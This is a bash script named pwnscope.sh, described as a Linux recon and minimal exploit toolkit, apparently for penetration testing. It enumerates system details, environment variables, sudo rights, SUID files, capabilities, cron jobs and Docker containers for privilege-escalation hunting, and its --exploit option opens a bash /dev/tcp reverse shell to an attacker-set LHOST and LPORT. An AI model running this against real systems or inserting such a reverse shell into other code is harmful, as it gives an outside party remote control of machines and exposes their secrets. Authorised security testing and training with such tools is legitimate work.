#!/bin/bash

# =======================================================
# ___________      ________________________________________ 
# ___  __ \_ | /| / /_  __ \_  ___/  ___/  __ \__  __ \  _ \
# __  /_/ /_ |/ |/ /_  / / /(__  )/ /__ / /_/ /_  /_/ /  __/
# _  .___/____/|__/ /_/ /_//____/ \___/ \____/_  .___/\___/ 
# /_/          
#            
# pwnscope.sh - Linux Recon & Minimal Exploit Toolkit
# Author: suuhm
# License: MIT
# Date: 2025
# =======================================================

show_usage() {
  cat << EOF
Usage: $0 [--short | --full | --exploit]

Options:
  --short    Quick system info and key checks
  --full     Extensive enumeration (takes longer)
  --exploit  Minimal reverse shell (requires LHOST and LPORT env variables)

Examples:
  $0 --short
  $0 --full
  LHOST=10.10.10.4 LPORT=4444 $0 --exploit
EOF
  exit 1
}

print_section() {
  sleep 1
  echo -e "\n================================================================="
  echo -e "\t\t[*] $1"
  echo "================================================================="
}

quick_checks() {
  print_section "Quick System Overview"
  echo "[+] Hostname     : $(hostname)"
  echo "[+] User         : $(whoami)"
  echo "[+] Kernel       : $(uname -r)"
  echo "[+] Uptime       : $(uptime -p)"
  echo "[+] CPU Model    : $(lscpu | grep 'Model name' | head -1 | cut -d ':' -f2 | xargs)"
  echo "[+] Memory Usage :"
  free -h | grep -E "Mem|Swap"

  print_section "Disk Usage (root)"
  df -h / | awk 'NR==1 || NR==2'

  print_section "Top 5 Processes (Memory)"
  ps aux --sort=-%mem | head -n6

  print_section "Open TCP/UDP Ports"
  ss -tuln | grep -E 'LISTEN|udp'
}

env_and_binaries() {
  print_section "ENV & BINARIES"
  echo "[+] Available shells:"
  cat /etc/shells 2>/dev/null

  echo -e "\n[+] PATH:"
  echo "$PATH"

  echo -e "\n[+] Available Language Interpreters:"
  for bin in python python3 perl ruby gcc nc socat; do
    which $bin &>/dev/null && echo " - $bin: $(which $bin)"
  done
}

full_checks() {
  quick_checks
  env_and_binaries

  print_section "Environment Variables"
  printenv

  print_section "Sudo Privileges"
  sudo -l 2>/dev/null || echo " - Not allowed or no sudo access"

  print_section "SUID Files (Top 10)"
  find / -perm -4000 -type f 2>/dev/null | head -n10

  print_section "File Capabilities"
  getcap -r / 2>/dev/null

  print_section "Network Interfaces"
  ip a

  print_section "Routing Table"
  ip r

  print_section "Cron Jobs"
  for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null | grep -v '^#' && echo "--- [$user] ---"
  done

  print_section "Docker Check"
  if command -v docker >/dev/null 2>&1; then
    docker ps -a
  else
    echo " - Docker not installed"
  fi
}

minimal_reverse_shell() {
  if [[ -z "$LHOST" || -z "$LPORT" ]]; then
    echo "[!] Please set LHOST and LPORT environment variables."
    exit 1
  fi

  print_section "Reverse Shell Attempt"
  echo "[*] Trying to connect back to $LHOST:$LPORT"

  if command -v bash >/dev/null 2>&1; then
    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
  elif command -v sh >/dev/null 2>&1; then
    sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1
  else
    echo "[!] No suitable shell found for reverse connection."
    exit 1
  fi
}

# Entry point
case "$1" in
  --short)
    quick_checks
    env_and_binaries
    ;;
  --full)
    full_checks
    ;;
  --exploit)
    minimal_reverse_shell
    ;;
  *)
    show_usage
    ;;
esac

exit 0
